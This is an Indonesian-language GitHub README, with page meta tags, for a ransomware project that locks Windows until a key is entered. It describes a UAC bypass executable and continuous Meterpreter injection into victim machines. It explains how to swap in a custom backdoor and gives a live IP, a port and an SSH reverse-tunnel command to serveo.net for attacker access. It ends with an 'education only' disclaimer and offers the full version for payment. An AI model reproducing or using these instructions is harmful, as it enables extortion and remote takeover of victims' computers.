<meta name="viewport" content="width = 320, initial-scale = 2.3, user-scalable = no">
<meta name="viewport" content="width = device-width">
<meta name="viewport" content="initial-scale = 1.0">
<meta name="viewport" content="initial-scale = 2.3, user-scalable = no">
<meta name="og:title" content="My Ransomeware"/>
<meta name="og:type" content="article"/>
<meta name="og:url" content="https://github.com/webmestudio/myransomeware"/>
<meta name="og:image" content="https://github.com/webmestudio/myransomeware/blob/master/screenshoot/RS1.PNG"/>
<meta name="og:site_name" content="Github Noname"/>
<meta name="og:description" content="(ransomware) adalah jenis perangkat perusak yang dirancang untuk menghalangi akses kepada sistem komputer atau data hingga tebusan dibayar. Jenis yang sederhana bekerja dengan mengunci sistem dengan cara yang tidak sulit untuk ditangani oleh orang yang ahli, sedangkan jenis yang lebih canggih akan mengenkripsi berkas sehingga tidak dapat diakses. Serangan perangkat pemeras umumnya dilakukan melalui Trojan yang disamarkan sebagai berkas yang sahih."/>

# My Ransomeware 2018

[Catatan]

- Jalankan software pada virtual operating system yang berjalan pada VMWare atau virtualBox

- Jangan merubah nama folder [VirusUI] atau mengedit nama file pada folder tersebut jika anda menjalankan pada BypassWinSetup.exe untuk mendapatkan akses UAC.

[Alat yang digunakan]

- Windows sub system linux (WSL) - Kali Linux

- Metasploit

- SSH

- VMWare

[Cara Kerja Software]

- Windows akan terkunci dan anda tidak bisa melakukan apa2 karna system inti di nonaktifkan cara satu2nya anda harus unlock dengan memasukan encrypt key ke dalam software untuk kambali ke seperti semula

- Selama komputer victim terhubung ke internet, maka komputer victim akan terus tersuntikan meterpreter dengan komputer penyerang secara realtime


[Opendoor.exe]

- jika anda sudah memiliki pengetahuan tentang pembuatan file backdoor, anda bisa merubah reverse untuk meterpreter dengan menimpah file Opendoor.exe dengan backdoor buatan anda.


[SSH]

- Backdoor mendengarkan port 9998 dengan IP 159.89.214.31 dari seveo.net

- [cmd] -> ssh -R 9998:127.0.0.1:4444 darksite@serveo.net


[Tested Works]

- Windows 10 versi up

- windows 8

- windows 7

[Screenshoot]

![alt tag](https://github.com/webmestudio/myransomeware/blob/master/screenshoot/RS1.PNG)

![alt tag](https://github.com/webmestudio/myransomeware/blob/master/screenshoot/RS2.PNG)

![alt tag](https://github.com/webmestudio/myransomeware/blob/master/screenshoot/RS3.PNG)

![alt tag](https://github.com/webmestudio/myransomeware/blob/master/screenshoot/RS4.PNG)

[Tujuan]

- Ini untuk edukasi saja, jadi gunakan dengan bijak :D

- Jika anda menginginkan versi developer software ini, anda bisa hubungi saya dan tidak gratis. 

- Kasih saya donasi untuk kopi dan rokok :D

- [Remember] Saya bukan hacker ataupun cracker. hanya saja saya suka mengulik sesuatu.
